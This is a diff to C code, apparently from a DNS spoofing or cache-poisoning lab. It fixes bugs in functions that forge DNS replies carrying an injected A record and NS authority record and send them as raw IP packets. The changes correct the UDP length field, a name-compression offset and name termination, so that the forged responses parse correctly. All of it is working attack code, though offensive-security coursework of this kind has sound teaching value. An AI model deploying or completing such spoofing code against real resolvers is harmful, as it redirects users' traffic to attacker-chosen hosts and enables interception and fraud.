@@ -91,6 +91,7 @@ void spoof_DNS_reply(struct ipheader* ip)
     struct dnsheader* dns = (struct dnsheader *) ((u_char *)udp + 8);//udp packet always 8 bytes
     int dnsSectionLength = construct_dns_reply(buffer + increment);
     newip->iph_len = htons(increment + dnsSectionLength);
+    newudp->udp_ulen = htons(dnsSectionLength + 8);
     send_raw_ip_packet(newip);
 }
 
@@ -134,7 +135,7 @@ unsigned short construct_dns_reply(char *buffer)
 	p += strlen(p) + 1 + 2 + 2; //Skip the Question section (no change)
 
 	p += set_A_record(p, NULL, 0x0C, ANSWER_IPADDR); //Add an A record (Answer section)
-	p += set_NS_record(p, NULL, 0x0F, NS_SERVER); //Add an NS record (Authority section)
+	p += set_NS_record(p, NULL, 0x0C, NS_SERVER); //Add an NS record (Authority section)
 	//p += set_A_record(p, NS_SERVER, 0, NS_IPADDR); //Add an A record (Additional section)
 	//printf("dns Length is %i",(p - buffer));
 	return p - buffer;
@@ -154,7 +155,7 @@ unsigned short set_A_record(char *buffer, char *name, char offset, char *ip_addr
 		p++;
 	} else {
 		strcpy(p, name);
-		p += strlen(name);
+		p += strlen(name) + 1;
 	}
 
 	*((unsigned short *)p ) = htons(0x01);	//Record Type
